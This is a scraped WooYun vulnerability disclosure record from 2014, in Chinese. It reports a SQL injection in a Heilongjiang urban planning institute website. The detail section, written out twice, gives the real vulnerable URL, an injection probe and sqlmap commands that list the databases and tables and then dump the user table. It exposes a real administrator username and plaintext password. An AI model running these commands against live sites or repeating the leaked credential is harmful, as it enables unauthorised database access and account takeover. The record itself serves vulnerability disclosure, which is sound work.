{"id": 52613, "wybug_id": "wooyun-2014-070678", "wybug_title": "黑龙江省城市规划勘测设计研究院某分站存在sql注入漏洞，密码明文", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "路人甲", "wybug_date": "2014-08-02 23:25", "wybug_open_date": "2014-09-16 23:26", "wybug_type": "SQL注射漏洞", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-07：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-16：\t细节向公众公开  简要描述： 黑龙江省城市规划勘测设计研究院某分站存在sql注入漏洞，利用漏洞可以查到管理员及密码，密码是明文的 详细说明：  黑龙江省城市规划勘测设计研究院某分站存在sql注入漏洞，注入点url:\nhttp://www.hcgy.com.cn/news.php?id=4\n在其后添加'and1=2'后页面报错啦\n\n接下来用sqlmap跑下，注入方式：Get 参数：id.得到两个数据库\navailable databases [2]:[*] hcgy[*] information_schema\n对hcgy操作，看看有没管理员之类的，\npython sqlmap/sqlmap.py -u www.hcgy.com.cn/news.php?id=4 -D hcgy --tables\n里面有6张表\nDatabase: hcgy[6 tables]+-----------------+| news            || producttype1    || producttype2    || tab_user        || tab_user_online || text            |+-----------------+\n有user再来一代码查看下列\npython sqlmap/sqlmap.py -u www.hcgy.com.cn/news.php?id=4 -D hcgy -T tab_user --columns\n结果如下\nDatabase: hcgyTable: tab_user[6 columns]+----------+-------------+| Column   | Type        |+----------+-------------+| datetime | datetime    || flag     | varchar(50) || id       | bigint(10)  || name     | varchar(50) || nickname | varchar(40) || password | varchar(50) |+----------+-------------+\npassword！！！最后碰下运气，看看密码能跑出来吗？\npython sqlmap/sqlmap.py -u www.hcgy.com.cn/news.php?id=4 -D hcgy -T tab_user -C \"id,name,nickname,password\" --dump\n\nDatabase: hcgyTable: tab_user[1 entry]+----+-----------+----------+----------+| id | name      | password | nickname |+----+-----------+----------+----------+| 9  | hljguihua | gh!@#    | 绯荤粺绠＄悊鍛�    |+----+-----------+----------+----------+\n密码明文，nickname是？？？？？这里乱码？好了，没再深入。密码加密啊，亲爱的   漏洞证明：  黑龙江省城市规划勘测设计研究院某分站存在sql注入漏洞，注入点url:\nhttp://www.hcgy.com.cn/news.php?id=4\n在其后添加'and1=2'后页面报错啦\n\n接下来用sqlmap跑下，注入方式：Get 参数：id.得到两个数据库\navailable databases [2]:[*] hcgy[*] information_schema\n对hcgy操作，看看有没管理员之类的，\npython sqlmap/sqlmap.py -u www.hcgy.com.cn/news.php?id=4 -D hcgy --tables\n里面有6张表\nDatabase: hcgy[6 tables]+-----------------+| news            || producttype1    || producttype2    || tab_user        || tab_user_online || text            |+-----------------+\n有user再来一代码查看下列\npython sqlmap/sqlmap.py -u www.hcgy.com.cn/news.php?id=4 -D hcgy -T tab_user --columns\n结果如下\nDatabase: hcgyTable: tab_user[6 columns]+----------+-------------+| Column   | Type        |+----------+-------------+| datetime | datetime    || flag     | varchar(50) || id       | bigint(10)  || name     | varchar(50) || nickname | varchar(40) || password | varchar(50) |+----------+-------------+\npassword！！！最后碰下运气，看看密码能跑出来吗？\npython sqlmap/sqlmap.py -u www.hcgy.com.cn/news.php?id=4 -D hcgy -T tab_user -C \"id,name,nickname,password\" --dump\n\nDatabase: hcgyTable: tab_user[1 entry]+----+-----------+----------+----------+| id | name      | password | nickname |+----+-----------+----------+----------+| 9  | hljguihua | gh!@#    | 绯荤粺绠＄悊鍛�    |+----+-----------+----------+----------+\n密码明文，nickname是？？？？？这里乱码？亲爱的，密码别再忘加密了   修复方案：  不清楚   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2014-08-07 09:30 厂商回复：   最新状态： 2014-08-08：补充之前处置情况：CNVD确认并复现所述漏洞情况，已经转由CNCERT下发给黑龙江分中心，由黑龙江分中心后续协调网站管理单位处置。  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}